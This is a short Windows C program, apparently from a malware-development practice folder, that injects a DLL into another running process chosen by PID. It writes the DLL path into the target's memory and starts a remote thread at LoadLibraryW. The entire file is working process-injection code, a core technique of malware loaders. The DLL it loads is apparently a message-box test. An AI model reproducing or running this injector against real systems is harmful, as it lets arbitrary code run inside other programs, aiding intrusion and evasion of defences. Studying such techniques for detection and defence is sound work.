#include <Windows.h>
#include <stdio.h>

DWORD pid, threadID;
LPVOID rBuffer;
HMODULE hKernel32;
HANDLE hProcess, hThread;

wchar_t dllPath[MAX_PATH] = L"C:\\Users\\noth1ngreal\\Maldev\\submariner\\DLLinjection\\msgbox.dll";
size_t dllPathSize = sizeof(dllPath);

int main(int argc, char *argv[]) {

    if (argc != 2) {
        printf("Usage: %s <PID>\n", argv[0]);
        return 1;
    }

    pid = atoi(argv[1]);

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

    if (hProcess == INVALID_HANDLE_VALUE || hProcess == NULL) {
        printf("Failed to open handle to process with PID %d: Error: %lu\n", pid, GetLastError());
        return -1;
    }

    printf("Successfully opened handle to process with PID %d: %p", pid, hProcess);

    rBuffer = VirtualAllocEx(hProcess, NULL, dllPathSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (rBuffer == NULL) return -1;
    printf("Memory allocated successfully at addresss: %p\n", rBuffer);

    size_t bytesWritten;
    WriteProcessMemory(hProcess, rBuffer, (void*) dllPath, dllPathSize, &bytesWritten);
    printf("Wrote %zu bytes to allocated memory.\n", bytesWritten);

    hKernel32 = GetModuleHandleW(L"Kernel32");

    if (hKernel32 == NULL) {
        printf("Failed to get a handle to Kernel32.dll. Error: %ld", GetLastError());
        CloseHandle(hProcess);
        return -1;
    }

    printf("Successfully got a handle to Kernel32.dll: %p.\n", hKernel32);

    LPTHREAD_START_ROUTINE pLoadLibraryW = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");
    printf("Successfully recieved address of LoadLibraryW: %p.\n", pLoadLibraryW);

    hThread = CreateRemoteThread(hProcess, NULL, 0, pLoadLibraryW, rBuffer, 0, &threadID);

    if (hThread == NULL) return -1;
    printf("Thread successfully created with ID: %lu\n", threadID);
    WaitForSingleObject(hThread, INFINITE);

    CloseHandle(hThread);
    CloseHandle(hProcess);

    return 0;
}